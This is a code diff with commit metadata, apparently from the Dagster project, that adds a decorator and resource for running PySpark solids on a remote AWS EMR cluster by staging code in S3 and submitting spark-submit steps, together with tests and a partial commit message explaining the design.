include LICENSE\ndiff --git a\/python_modules\/libraries\/dagster-aws\/dagster_aws\/emr\/main.py.template b\/python_modules\/libraries\/dagster-aws\/dagster_aws\/emr\/main.py.template\nnew file mode 100644\nindex 00000000000..81d5243677b\n--- \/dev\/null\n+++ b\/python_modules\/libraries\/dagster-aws\/dagster_aws\/emr\/main.py.template\n@@ -0,0 +1,21 @@\n+import sys\n+\n+from pyspark import SparkFiles\n+from pyspark.sql import SparkSession\n+\n+spark = SparkSession.builder.getOrCreate()\n+sc = spark.sparkContext\n+sys.path.insert(0, SparkFiles.getRootDirectory())\n+\n+from dagster import RunConfig\n+from dagster.utils.test import execute_solid_within_pipeline\n+\n+from {pipeline_file} import {pipeline_fn_name}\n+\n+if __name__ == '__main__':\n+    execute_solid_within_pipeline(\n+        {pipeline_fn_name},\n+        '{solid_name}',\n+        environment_dict={environment_dict},\n+        run_config=RunConfig(mode='{mode_name}'),\n+    )\n\\ No newline at end of file\ndiff --git a\/python_modules\/libraries\/dagster-aws\/dagster_aws\/emr\/resources.py b\/python_modules\/libraries\/dagster-aws\/dagster_aws\/emr\/resources.py\nnew file mode 100644\nindex 00000000000..5da9fe2ec78\n--- \/dev\/null\n+++ b\/python_modules\/libraries\/dagster-aws\/dagster_aws\/emr\/resources.py\n@@ -0,0 +1,237 @@\n+import os\n+\n+import boto3\n+import six\n+from botocore.exceptions import WaiterError\n+from dagster_pyspark import PySparkResourceDefinition\n+from dagster_spark.configs_spark import spark_config\n+from dagster_spark.utils import flatten_dict, format_for_cli\n+\n+from dagster import Field, check, resource\n+from dagster.core.errors import DagsterInvalidDefinitionError\n+from dagster.seven import get_system_temp_directory\n+\n+from .utils import build_main_file, build_pyspark_zip, get_install_requirements_step\n+\n+# On EMR, Spark is installed here\n+EMR_SPARK_HOME = '\/usr\/lib\/spark\/'\n+\n+\n+class EMRPySparkResource(PySparkResourceDefinition):\n+    def __init__(self, config):\n+        self.config = config\n+        self.emr_client = boto3.client('emr', region_name=self.config['region_name'])\n+        self.s3_client = boto3.client('s3', region_name=self.config['region_name'])\n+\n+        # Construct the SparkSession\n+        super(EMRPySparkResource, self).__init__(self.config.get('spark_conf'))\n+\n+    def get_compute_fn(self, fn, solid_name):\n+        '''Construct new compute function for EMR pyspark execution. In the scenario where we are\n+        running on a Dagster box, we will (1) sync the client code to an S3 staging bucket, and then\n+        (2) invoke execution via the EMR APIs.\n+\n+        On EMR, we'll just return the original solid function body to kick off normal pyspark\n+        execution. Since that will be launched on the EMR master node with YARN, it will\n+        automatically use the EMR cluster for execution.\n+        '''\n+\n+        if self.running_on_emr:\n+            return fn\n+\n+        def new_compute_fn(context):\n+            self._sync_code_to_s3(context, solid_name)\n+            step_defs = self._get_execute_steps(context, solid_name)\n+            steps = self.add_job_flow_steps(step_defs)\n+            self.wait_for_steps(context, steps['StepIds'])\n+\n+        return new_compute_fn\n+\n+    def _sync_code_to_s3(self, context, solid_name):\n+        '''Synchronize the pyspark code to an S3 staging bucket for use on EMR. Note that\n+        requirements are installed separately when a requirements.txt is provided.\n+\n+        For the zip file, consider the following toy example:\n+\n+        # Folder: my_pyspark_project\/\n+        # a.py\n+        def foo():\n+            print(1)\n+\n+        # b.py\n+        def bar():\n+            print(2)\n+\n+        # main.py\n+        from a import foo\n+        from b import bar\n+\n+        foo()\n+        bar()\n+\n+        This will zip up `my_pyspark_project\/` as `my_pyspark_project.zip`. Then, when running\n+        `spark-submit --py-files my_pyspark_project.zip main.py` on EMR this will print 1, 2.\n+\n+        Note that we also dynamically construct main.py to support targeting execution of a single\n+        solid on EMR vs. the entire pipeline.\n+        '''\n+        run_id = context.run_id\n+        main_file = os.path.join(get_system_temp_directory(), '%s-main.py' % run_id)\n+        zip_file = os.path.join(get_system_temp_directory(), '%s-pyspark.zip' % run_id)\n+\n+        try:\n+            build_main_file(\n+                main_file,\n+                mode_name=context.pipeline_run.mode,\n+                pipeline_file=self.config['pipeline_file'],\n+                solid_name=solid_name,\n+                environment_dict=context.environment_dict,\n+                pipeline_fn_name=self.config['pipeline_fn_name'],\n+            )\n+\n+            build_pyspark_zip(\n+                zip_file=zip_file,\n+                path=os.path.dirname(os.path.abspath(self.config['pipeline_file'])),\n+            )\n+\n+            self.s3_client.upload_file(\n+                zip_file, self.config['staging_bucket'], run_id + '\/pyspark.zip'\n+            )\n+            self.s3_client.upload_file(\n+                main_file, self.config['staging_bucket'], run_id + '\/main.py'\n+            )\n+\n+        finally:\n+            if os.path.exists(main_file):\n+                os.unlink(main_file)\n+            if os.path.exists(zip_file):\n+                os.unlink(zip_file)\n+\n+    def _get_execute_steps(self, context, solid_name):\n+        '''From the local Dagster instance, construct EMR steps that will kick off execution on a\n+        remote EMR cluster.\n+        '''\n+        action_on_failure = self.config['action_on_failure']\n+        staging_bucket = self.config['staging_bucket']\n+\n+        run_id = context.run_id\n+        local_root = os.path.dirname(os.path.abspath(self.config['pipeline_file']))\n+\n+        steps = []\n+\n+        # Install Python dependencies if a requirements file exists\n+        requirements_file = self.config.get('requirements_file_path')\n+        if requirements_file and not os.path.exists(requirements_file):\n+            raise DagsterInvalidDefinitionError(\n+                'The requirements.txt file that was specified does not exist'\n+            )\n+\n+        if not requirements_file:\n+            requirements_file = os.path.join(local_root, 'requirements.txt')\n+\n+        if os.path.exists(requirements_file):\n+            with open(requirements_file, 'rb') as f:\n+                python_dependencies = six.ensure_str(f.read()).split('\\n')\n+                steps.append(get_install_requirements_step(python_dependencies, action_on_failure))\n+\n+        # Execute Solid via spark-submit\n+        conf = dict(flatten_dict(self.config.get('spark_conf')))\n+        conf['spark.app.name'] = conf.get('spark.app.name', solid_name)\n+\n+        check.invariant(\n+            conf.get('spark.master', 'yarn') == 'yarn',\n+            desc='spark.master is configured as %s; cannot set Spark master on EMR to anything '\n+            'other than \"yarn\"' % conf.get('spark.master'),\n+        )\n+\n+        steps.append(\n+            {\n+                'Name': 'Execute Solid %s' % solid_name,\n+                'ActionOnFailure': action_on_failure,\n+                'HadoopJarStep': {\n+                    'Jar': 'command-runner.jar',\n+                    'Args': [\n+                        EMR_SPARK_HOME + 'bin\/spark-submit',\n+                        '--master',\n+                        'yarn',\n+                        '--deploy-mode',\n+                        conf.get('spark.submit.deployMode', 'client'),\n+                    ]\n+                    + format_for_cli(list(flatten_dict(conf)))\n+                    + [\n+                        '--py-files',\n+                        's3:\/\/%s\/%s\/pyspark.zip' % (staging_bucket, run_id),\n+                        's3:\/\/%s\/%s\/main.py' % (staging_bucket, run_id),\n+                    ],\n+                },\n+            }\n+        )\n+        return steps\n+\n+    def add_job_flow_steps(self, step_defs):\n+        '''Submit the constructed job flow steps to EMR for execution.\n+        '''\n+        return self.emr_client.add_job_flow_steps(\n+            JobFlowId=self.config['job_flow_id'], Steps=step_defs\n+        )\n+\n+    def wait_for_steps(self, context, step_ids):\n+        '''Uses the boto3 waiter to wait for job flow step completion.\n+        '''\n+        waiter = self.emr_client.get_waiter('step_complete')\n+\n+        try:\n+            context.log.info(\n+                'Waiting for steps: '\n+                + str(\n+                    self.emr_client.list_steps(\n+                        ClusterId=self.config['job_flow_id'], StepIds=step_ids\n+                    )\n+                )\n+            )\n+            for step_id in step_ids:\n+                waiter.wait(\n+                    ClusterId=self.config['job_flow_id'],\n+                    StepId=step_id,\n+                    WaiterConfig={'Delay': 5, 'MaxAttempts': 100},\n+                )\n+        except WaiterError:\n+            context.log.warning('Timed out waiting for EMR steps to finish')\n+\n+    @property\n+    def running_on_emr(self):\n+        '''Detects whether we are running on the EMR cluster\n+        '''\n+        if os.path.exists('\/mnt\/var\/lib\/info\/job-flow.json'):\n+            return True\n+        return False\n+\n+\n+@resource(\n+    {\n+        'pipeline_file': Field(str, description='Path to the file where the pipeline is defined'),\n+        'pipeline_fn_name': Field(str),\n+        'spark_config': spark_config(),\n+        'job_flow_id': Field(str, description='Name of the job flow (cluster) on which to execute'),\n+        'region_name': Field(str),\n+        'action_on_failure': Field(str, is_optional=True, default_value='CANCEL_AND_WAIT'),\n+        'staging_bucket': Field(\n+            str,\n+            is_optional=False,\n+            description='S3 staging bucket to use for staging the produced main.py and zip file of'\n+            ' Python code',\n+        ),\n+        'requirements_file_path': Field(\n+            str,\n+            is_optional=True,\n+            description='Path to a requirements.txt file; the current directory is searched if none'\n+            ' is specified.',\n+        ),\n+    }\n+)\n+def emr_pyspark_resource(init_context):\n+    emr_pyspark = EMRPySparkResource(init_context.resource_config)\n+    try:\n+        yield emr_pyspark\n+    finally:\n+        emr_pyspark.stop()\ndiff --git a\/python_modules\/libraries\/dagster-aws\/dagster_aws\/emr\/utils.py b\/python_modules\/libraries\/dagster-aws\/dagster_aws\/emr\/utils.py\nnew file mode 100644\nindex 00000000000..b6267f9cafb\n--- \/dev\/null\n+++ b\/python_modules\/libraries\/dagster-aws\/dagster_aws\/emr\/utils.py\n@@ -0,0 +1,63 @@\n+import copy\n+import os\n+import zipfile\n+\n+import six\n+\n+from dagster.utils import script_relative_path\n+\n+\n+def subset_environment_dict(environment_dict, solid_name):\n+    subset = copy.deepcopy(environment_dict)\n+    if 'solids' in subset:\n+        solid_config_keys = list(subset['solids'].keys())\n+        for key in solid_config_keys:\n+            if key != solid_name:\n+                del subset['solids'][key]\n+    return subset\n+\n+\n+def build_main_file(\n+    main_file, mode_name, pipeline_file, solid_name, environment_dict, pipeline_fn_name\n+):\n+    with open(script_relative_path('main.py.template'), 'rb') as f:\n+        main_template_str = six.ensure_str(f.read())\n+\n+    with open(main_file, 'wb') as f:\n+        f.write(\n+            six.ensure_binary(\n+                main_template_str.format(\n+                    mode_name=mode_name,\n+                    pipeline_file=os.path.splitext(os.path.basename(pipeline_file))[0],\n+                    solid_name=solid_name,\n+                    environment_dict=subset_environment_dict(environment_dict, solid_name),\n+                    pipeline_fn_name=pipeline_fn_name,\n+                )\n+            )\n+        )\n+\n+\n+def build_pyspark_zip(zip_file, path):\n+    '''Archives the current path into a file named `zip_file`\n+    '''\n+    with zipfile.ZipFile(zip_file, 'w', zipfile.ZIP_DEFLATED) as zf:\n+        for root, _, files in os.walk(path):\n+            for fname in files:\n+                abs_fname = os.path.join(root, fname)\n+\n+                # Skip various artifacts\n+                if 'pytest' in abs_fname or '__pycache__' in abs_fname or 'pyc' in abs_fname:\n+                    continue\n+\n+                zf.write(abs_fname, os.path.relpath(os.path.join(root, fname), path))\n+\n+\n+def get_install_requirements_step(python_dependencies, action_on_failure, python_binary='python3'):\n+    return {\n+        'Name': 'Install Dependencies',\n+        'ActionOnFailure': action_on_failure,\n+        'HadoopJarStep': {\n+            'Jar': 'command-runner.jar',\n+            'Args': ['sudo', python_binary, '-m', 'pip', 'install'] + python_dependencies,\n+        },\n+    }\ndiff --git a\/python_modules\/libraries\/dagster-aws\/dagster_aws_tests\/emr_tests\/requirements.txt b\/python_modules\/libraries\/dagster-aws\/dagster_aws_tests\/emr_tests\/requirements.txt\nnew file mode 100644\nindex 00000000000..f53d93ce794\n--- \/dev\/null\n+++ b\/python_modules\/libraries\/dagster-aws\/dagster_aws_tests\/emr_tests\/requirements.txt\n@@ -0,0 +1,8 @@\n+boto3\n+dagster\n+dagit\n+dagster_aws\n+dagster_pyspark\n+dagster_spark\n+moto\n+pytest\n\\ No newline at end of file\ndiff --git a\/python_modules\/libraries\/dagster-aws\/dagster_aws_tests\/emr_tests\/test_pyspark.py b\/python_modules\/libraries\/dagster-aws\/dagster_aws_tests\/emr_tests\/test_pyspark.py\nnew file mode 100644\nindex 00000000000..2505b1f5d0a\n--- \/dev\/null\n+++ b\/python_modules\/libraries\/dagster-aws\/dagster_aws_tests\/emr_tests\/test_pyspark.py\n@@ -0,0 +1,116 @@\n+import os\n+\n+import boto3\n+import pytest\n+from dagster_aws.emr.resources import emr_pyspark_resource\n+from dagster_pyspark import pyspark_resource, pyspark_solid\n+from moto import mock_emr\n+\n+from dagster import Field, ModeDefinition, RunConfig, execute_pipeline, pipeline\n+from dagster.seven import mock\n+\n+\n+@pyspark_solid\n+def example_solid(context):\n+    list_p = [('John', 19), ('Jennifer', 29), ('Adam', 35), ('Henry', 50)]\n+    rdd = context.resources.pyspark.spark_context.parallelize(list_p)\n+    res = rdd.take(2)\n+    for name, age in res:\n+        context.log.info('%s: %d' % (name, age))\n+\n+\n+@pyspark_solid(\n+    name='blah', description='this is a test', config={'foo': Field(str), 'bar': Field(int)}\n+)\n+def other_example_solid(context):\n+    list_p = [('John', 19), ('Jennifer', 29), ('Adam', 35), ('Henry', 50)]\n+    rdd = context.resources.pyspark.spark_context.parallelize(list_p)\n+    res = rdd.take(2)\n+    for name, age in res:\n+        context.log.info('%s: %d' % (name, age))\n+\n+\n+@pipeline(\n+    mode_defs=[\n+        ModeDefinition('prod', resource_defs={'pyspark': emr_pyspark_resource}),\n+        ModeDefinition('local', resource_defs={'pyspark': pyspark_resource}),\n+    ]\n+)\n+def example_pipe():\n+    example_solid()\n+    other_example_solid()\n+\n+\n+def test_local():\n+    result = execute_pipeline(\n+        example_pipe,\n+        environment_dict={'solids': {'blah': {'config': {'foo': 'a string', 'bar': 123}}},},\n+        run_config=RunConfig(mode='local'),\n+    )\n+    assert result.success\n+\n+\n+@mock_emr\n+@mock.patch('dagster_aws.emr.resources.EMRPySparkResource.wait_for_steps')\n+def test_pyspark_emr(mock_wait):\n+    client = boto3.client('emr', region_name='us-west-1')\n+\n+    run_job_flow_args = dict(\n+        Instances={\n+            'InstanceCount': 1,\n+            'KeepJobFlowAliveWhenNoSteps': True,\n+            'MasterInstanceType': 'c3.medium',\n+            'Placement': {'AvailabilityZone': 'us-west-1a'},\n+            'SlaveInstanceType': 'c3.xlarge',\n+        },\n+        JobFlowRole='EMR_EC2_DefaultRole',\n+        LogUri='s3:\/\/mybucket\/log',\n+        Name='cluster',\n+        ServiceRole='EMR_DefaultRole',\n+        VisibleToAllUsers=True,\n+    )\n+\n+    job_flow_id = client.run_job_flow(**run_job_flow_args)['JobFlowId']\n+    result = execute_pipeline(\n+        example_pipe,\n+        environment_dict={\n+            'solids': {'blah': {'config': {'foo': 'a string', 'bar': 123}}},\n+            'resources': {\n+                'pyspark': {\n+                    'config': {\n+                        'pipeline_file': __file__,\n+                        'pipeline_fn_name': 'example_pipe',\n+                        'job_flow_id': job_flow_id,\n+                        'staging_bucket': 'dagster-scratch-80542c2',\n+                        'region_name': 'us-west-1',\n+                    }\n+                }\n+            },\n+        },\n+        run_config=RunConfig(mode='prod'),\n+    )\n+    assert result.success\n+    assert mock_wait.called_once\n+\n+\n+@pytest.mark.skip\n+def test_do_it_live_emr():\n+    result = execute_pipeline(\n+        example_pipe,\n+        environment_dict={\n+            'solids': {'blah': {'config': {'foo': 'a string', 'bar': 123}}},\n+            'resources': {\n+                'pyspark': {\n+                    'config': {\n+                        'pipeline_file': __file__,\n+                        'pipeline_fn_name': 'example_pipe',\n+                        'job_flow_id': os.environ.get('AWS_EMR_JOB_FLOW_ID'),\n+                        'staging_bucket': 'dagster-scratch-80542c2',\n+                        'region_name': 'us-west-1',\n+                    }\n+                }\n+            },\n+        },\n+        run_config=RunConfig(mode='prod'),\n+    )\n+    assert result.success\ndiff --git a\/python_modules\/libraries\/dagster-aws\/dagster_aws_tests\/emr_tests\/test_utils.py b\/python_modules\/libraries\/dagster-aws\/dagster_aws_tests\/emr_tests\/test_utils.py\nnew file mode 100644\nindex 00000000000..f23691ea3aa\n--- \/dev\/null\n+++ b\/python_modules\/libraries\/dagster-aws\/dagster_aws_tests\/emr_tests\/test_utils.py\n@@ -0,0 +1,23 @@\n+from dagster_aws.emr.utils import subset_environment_dict\n+\n+\n+def test_subset_environment_dict():\n+    environment_dict = {\n+        'solids': {'blah': {'config': {'foo': 'a string', 'bar': 123}}},\n+        'resources': {\n+            'pyspark': {\n+                'config': {\n+                    'pipeline_file': 'dagster_aws_tests\/emr_tests\/test_pyspark.py',\n+                    'pipeline_fn_name': 'pipe',\n+                    'job_flow_id': 'j-272P42200OZ0Q',\n+                    'staging_bucket': 'dagster-scratch-80542c2',\n+                    'region_name': 'us-west-1',\n+                }\n+            }\n+        },\n+    }\n+    res = subset_environment_dict(environment_dict, 'blah')\n+    assert res == environment_dict\n+\n+    res = subset_environment_dict(environment_dict, 'not_here')\n+    assert res['solids'] == {}\ndiff --git a\/python_modules\/libraries\/dagster-aws\/setup.py b\/python_modules\/libraries\/dagster-aws\/setup.py\nindex acfa7dd513e..892c7befed7 100644\n--- a\/python_modules\/libraries\/dagster-aws\/setup.py\n+++ b\/python_modules\/libraries\/dagster-aws\/setup.py\n@@ -39,8 +39,8 @@ def _do_setup(name='dagster-aws'):\n         packages=find_packages(exclude=['test']),\n         include_package_data=True,\n         install_requires=['boto3==1.9.*', 'dagster', 'requests', 'terminaltables'],\n+        extras_require={'pyspark': ['dagster-pyspark']},\n         tests_require=['moto==1.3.*'],\n-        extras_require={':python_version<\"3\"': ['backports.tempfile']},\n         entry_points={'console_scripts': ['dagster-aws = dagster_aws.cli.cli:main']},\n         zip_safe=False,\n     )\ndiff --git a\/python_modules\/libraries\/dagster-aws\/tox.ini b\/python_modules\/libraries\/dagster-aws\/tox.ini\nindex f84b4bbfdf1..bf5270ee64f 100644\n--- a\/python_modules\/libraries\/dagster-aws\/tox.ini\n+++ b\/python_modules\/libraries\/dagster-aws\/tox.ini\n@@ -10,6 +10,8 @@ platform =\n deps =\n   -e ..\/..\/dagster\n   -r ..\/..\/dagster\/dev-requirements.txt\n+  -e ..\/dagster-spark\n+  -e ..\/dagster-pyspark\n   -r .\/dev-requirements.txt\n   -e .\n usedevelop = true\ndiff --git a\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/__init__.py b\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/__init__.py\nindex 5f1367b451f..94eef4bb83d 100644\n--- a\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/__init__.py\n+++ b\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/__init__.py\n@@ -1,10 +1,7 @@\n import os\n \n-from dagster_spark.configs_spark import spark_config\n-from dagster_spark.utils import flatten_dict\n from pyspark.rdd import RDD\n from pyspark.sql import DataFrame as NativeSparkDataFrame\n-from pyspark.sql import SparkSession\n \n from dagster import (\n     Bool,\n@@ -22,6 +19,14 @@\n from dagster.core.types import Selector, input_selector_schema, output_selector_schema\n from dagster.core.types.runtime import define_any_type\n \n+from .decorators import pyspark_solid\n+from .resources import (\n+    PySparkResourceDefinition,\n+    pyspark_resource,\n+    spark_session_from_config,\n+    spark_session_resource,\n+)\n+\n \n @input_selector_schema(\n     Selector(\n@@ -78,25 +83,6 @@ def write_rdd(context, file_type, file_options, spark_rdd):\n )\n \n \n-def spark_session_from_config(spark_conf=None):\n-    spark_conf = check.opt_dict_param(spark_conf, 'spark_conf')\n-    builder = SparkSession.builder\n-    flat = flatten_dict(spark_conf)\n-    for key, value in flat:\n-        builder = builder.config(key, value)\n-\n-    return builder.getOrCreate()\n-\n-\n-@resource({'spark_conf': spark_config()})\n-def spark_session_resource(init_context):\n-    spark = spark_session_from_config(init_context.resource_config['spark_conf'])\n-    try:\n-        yield spark\n-    finally:\n-        spark.stop()\n-\n-\n @output_selector_schema(\n     Selector(\n         {\ndiff --git a\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/decorators.py b\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/decorators.py\nnew file mode 100644\nindex 00000000000..ee8fd82c475\n--- \/dev\/null\n+++ b\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/decorators.py\n@@ -0,0 +1,63 @@\n+from dagster import check, solid\n+\n+\n+def pyspark_solid(\n+    name=None,\n+    description=None,\n+    input_defs=None,\n+    output_defs=None,\n+    config=None,\n+    required_resource_keys=None,\n+    metadata=None,\n+    step_metadata_fn=None,\n+    pyspark_resource_key=None,\n+):\n+    # Permit the user to provide a named pyspark resource\n+    pyspark_resource_key = check.opt_str_param(\n+        pyspark_resource_key, 'pyspark_resource_key', default='pyspark'\n+    )\n+\n+    # Expect a pyspark resource\n+    required_resource_keys = check.opt_set_param(required_resource_keys, 'required_resource_keys')\n+    required_resource_keys.add(pyspark_resource_key)\n+\n+    # nonlocal keyword not available in Python 2\n+    non_local = {'name': name, 'required_resource_keys': required_resource_keys}\n+\n+    # Handle when we're called bare without arguments (e.g. name is actually the callable, not the\n+    # solid name)\n+    if callable(name):\n+\n+        @solid(name=name.__name__, required_resource_keys=required_resource_keys)\n+        def new_compute_fn(context):\n+            return context.resources.pyspark.get_compute_fn(fn=name, solid_name=name.__name__)(\n+                context\n+            )\n+\n+        return new_compute_fn\n+\n+    def wrap(fn):\n+        name = non_local['name'] or fn.__name__\n+\n+        @solid(\n+            name=name,\n+            description=description,\n+            input_defs=input_defs,\n+            output_defs=output_defs,\n+            config=config,\n+            required_resource_keys=non_local['required_resource_keys'],\n+            metadata=metadata,\n+            step_metadata_fn=step_metadata_fn,\n+        )\n+        def new_compute_fn(context):\n+            from .resources import PySparkResourceDefinition\n+\n+            spark = check.inst(\n+                getattr(context.resources, pyspark_resource_key), PySparkResourceDefinition\n+            )\n+\n+            return spark.get_compute_fn(fn, name)(context)\n+\n+        return new_compute_fn\n+\n+    return wrap\ndiff --git a\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/resources.py b\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/resources.py\nnew file mode 100644\nindex 00000000000..fc3b9560196\n--- \/dev\/null\n+++ b\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/resources.py\n@@ -0,0 +1,61 @@\n+import abc\n+\n+import six\n+from dagster_spark.configs_spark import spark_config\n+from dagster_spark.utils import flatten_dict\n+from pyspark.sql import SparkSession\n+\n+from dagster import check, resource\n+\n+\n+def spark_session_from_config(spark_conf=None):\n+    spark_conf = check.opt_dict_param(spark_conf, 'spark_conf')\n+    builder = SparkSession.builder\n+    flat = flatten_dict(spark_conf)\n+    for key, value in flat:\n+        builder = builder.config(key, value)\n+\n+    return builder.getOrCreate()\n+\n+\n+class PySparkResourceDefinition(six.with_metaclass(abc.ABCMeta)):\n+    def __init__(self, spark_conf):\n+        self._spark_session = spark_session_from_config(spark_conf)\n+\n+    @property\n+    def spark_session(self):\n+        return self._spark_session\n+\n+    @property\n+    def spark_context(self):\n+        return self.spark_session.sparkContext\n+\n+    def stop(self):\n+        self._spark_session.stop()\n+\n+    @abc.abstractmethod\n+    def get_compute_fn(self, fn, solid_name):\n+        pass\n+\n+\n+class SystemPySparkResource(PySparkResourceDefinition):\n+    def get_compute_fn(self, fn, solid_name):\n+        return fn\n+\n+\n+@resource({'spark_conf': spark_config()})\n+def pyspark_resource(init_context):\n+    pyspark = SystemPySparkResource(init_context.resource_config['spark_conf'])\n+    try:\n+        yield pyspark\n+    finally:\n+        pyspark.stop()\n+\n+\n+@resource({'spark_conf': spark_config()})\n+def spark_session_resource(init_context):\n+    spark = spark_session_from_config(init_context.resource_config['spark_conf'])\n+    try:\n+        yield spark\n+    finally:\n+        spark.stop()\ndiff --git a\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark_tests\/__init__.py b\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark_tests\/__init__.py\nnew file mode 100644\nindex 00000000000..e69de29bb2d\ndiff --git a\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark_tests\/test_decorators.py b\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark_tests\/test_decorators.py\nnew file mode 100644\nindex 00000000000..8c8ba519b0e\n--- \/dev\/null\n+++ b\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark_tests\/test_decorators.py\n@@ -0,0 +1,67 @@\n+from dagster_pyspark import pyspark_resource, pyspark_solid\n+\n+from dagster import Field, ModeDefinition, RunConfig, execute_pipeline, pipeline\n+\n+\n+def test_simple_pyspark_decorator():\n+    @pyspark_solid\n+    def pyspark_job(context):\n+        rdd = context.resources.pyspark.spark_context.parallelize(range(10))\n+        for item in rdd.collect():\n+            print(item)\n+\n+    @pipeline(mode_defs=[ModeDefinition('default', resource_defs={'pyspark': pyspark_resource})])\n+    def pipe():\n+        pyspark_job()\n+\n+    assert execute_pipeline(pipe, run_config=RunConfig(mode='default')).success\n+\n+\n+def test_named_pyspark_decorator():\n+    @pyspark_solid(name='blah', description='foo bar', config={'foo': Field(str)})\n+    def pyspark_job(context):\n+        rdd = context.resources.pyspark.spark_context.parallelize(range(10))\n+        for item in rdd.collect():\n+            print(item)\n+\n+    @pipeline(mode_defs=[ModeDefinition('default', resource_defs={'pyspark': pyspark_resource})])\n+    def pipe():\n+        pyspark_job()\n+\n+    assert execute_pipeline(\n+        pipe,\n+        environment_dict={'solids': {'blah': {'config': {'foo': 'baz'}}}},\n+        run_config=RunConfig(mode='default'),\n+    ).success\n+\n+\n+def test_default_pyspark_decorator():\n+    @pyspark_solid(pyspark_resource_key='first_pyspark')\n+    def first_pyspark_job(context):\n+        list_p = [('Michelle', 19), ('Austin', 29), ('Lydia', 35)]\n+        rdd = context.resources.first_pyspark.spark_context.parallelize(list_p)\n+        res = rdd.take(2)\n+        for name, age in res:\n+            print('%s: %d' % (name, age))\n+\n+    @pyspark_solid(pyspark_resource_key='last_pyspark')\n+    def last_pyspark_job(context):\n+        list_p = [('John', 19), ('Jennifer', 29), ('Adam', 35), ('Henry', 50)]\n+        rdd = context.resources.last_pyspark.spark_context.parallelize(list_p)\n+        res = rdd.take(2)\n+        for name, age in res:\n+            print('%s: %d' % (name, age))\n+\n+    @pipeline(\n+        mode_defs=[\n+            ModeDefinition(\n+                'default',\n+                resource_defs={'first_pyspark': pyspark_resource, 'last_pyspark': pyspark_resource},\n+            )\n+        ]\n+    )\n+    def pipe():\n+        first_pyspark_job()\n+        last_pyspark_job()\n+\n+    assert execute_pipeline(pipe, run_config=RunConfig(mode='default')).success\ndiff --git a\/python_modules\/libraries\/dagster-spark\/dagster_spark\/utils.py b\/python_modules\/libraries\/dagster-spark\/dagster_spark\/utils.py\nindex 9562480ae10..f08e55ab8c0 100644\n--- a\/python_modules\/libraries\/dagster-spark\/dagster_spark\/utils.py\n+++ b\/python_modules\/libraries\/dagster-spark\/dagster_spark\/utils.py\n@@ -17,7 +17,8 @@ def _flatten_dict(d, result, key_path=None):\n                 result.append(('.'.join(new_key_path), v))\n \n     result = []\n-    _flatten_dict(d, result)\n+    if d is not None:\n+        _flatten_dict(d, result)\n     return result\n \n \n@@ -28,6 +29,10 @@ def parse_spark_config(spark_conf):\n     '''\n \n     spark_conf_list = flatten_dict(spark_conf)\n+    return format_for_cli(spark_conf_list)\n+\n+\n+def format_for_cli(spark_conf_list):\n     return list(\n         itertools.chain.from_iterable([('--conf', '{}={}'.format(*c)) for c in spark_conf_list])\n     )\n","files":{"\/.pylintrc":{"changes":[{"diff":"\n # See: https:\/\/github.com\/getsentry\/responses\/issues\/74\n [TYPECHECK]\n ignored-classes=responses\n-signature-mutators=solid,composite_solid,lambda_solid\n+signature-mutators=solid,pyspark_solid,composite_solid,lambda_solid\n \n [MASTER]\n ignore=snapshots\n\\ No newline at end of file","add":1,"remove":1,"filename":"\/.pylintrc","badparts":["signature-mutators=solid,composite_solid,lambda_solid"],"goodparts":["signature-mutators=solid,pyspark_solid,composite_solid,lambda_solid"]},{"diff":"\n # See: https:\/\/github.com\/getsentry\/responses\/issues\/74\n [TYPECHECK]\n ignored-classes=responses\n-signature-mutators=solid,composite_solid,lambda_solid\n+signature-mutators=solid,pyspark_solid,composite_solid,lambda_solid\n \n [MASTER]\n ignore=snapshots\n\\ No newline at end of file","add":1,"remove":1,"filename":"\/.pylintrc","badparts":["signature-mutators=solid,composite_solid,lambda_solid"],"goodparts":["signature-mutators=solid,pyspark_solid,composite_solid,lambda_solid"]}],"source":"\n[MESSAGES CONTROL] disable=C,R,duplicate-code,W0511,W1201,W1202,no-init [TYPECHECK] ignored-classes=responses signature-mutators=solid,composite_solid,lambda_solid [MASTER] ignore=snapshots ","sourceWithComments":"[MESSAGES CONTROL]\n\n# Enable the message, report, category or checker with the given id(s). You can\n# either give multiple identifier separated by comma (,) or put this option\n# multiple time.\n#enable=\n\n# Disable the message, report, category or checker with the given id(s). You\n# can either give multiple identifier separated by comma (,) or put this option\n# multiple time (only on the command line, not in the configuration file where\n# it should appear only once).#\n#\n# R - refactoring related checks\n# C - convention related checks\n# W0511 disable TODO warning\n# W1201, W1202 disable log format warning. False positives (I think)\n\ndisable=C,R,duplicate-code,W0511,W1201,W1202,no-init\n\n# See: https:\/\/github.com\/getsentry\/responses\/issues\/74\n[TYPECHECK]\nignored-classes=responses\nsignature-mutators=solid,composite_solid,lambda_solid\n\n[MASTER]\nignore=snapshots"}},"msg":"pyspark on EMR\n\nSummary:\n**Summary**\nPutting this up for discussion.\n\nThis is a (rough) cut at the thing @sashank, @max and I were discussing on Friday, where we use a decorator to express that a pyspark solid's compute function should behave differently when shipping compute to a remote EMR cluster.\n\n**Context**\nEMR must run pyspark workloads with `yarn` specified as the master URI. To run this way, Spark must have access to a local Hadoop\/Spark\/YARN install on the machine running `spark-submit` or calling `SparkSession.builder.getOrCreate()`, and this local installation must be properly configured with `core-site.xml`, etc. along with all other Hadoop XML files that define the DNS names and hosts in the YARN cluster.\n\nThis is easy when invoking a job directly on the EMR master (already configured), or through the EMR `boto3` APIs, but not something you can set up locally (very difficult to get everything configured correctly, and fragile).\n\nBecause of this, there isn't a way to tell EMR to \"run just this one solid\"\u2014EMR expects us to invoke `spark-submit <options> foo.py` either in a shell command on the master or via the EMR APIs, and it expects `foo.py` to be a self-contained pyspark application.\n\nGiven this, there is no obvious way to have pyspark solids structured like we've done historically, because the locally-constructed `SparkSession` won't be capable of interacting with a remote EMR 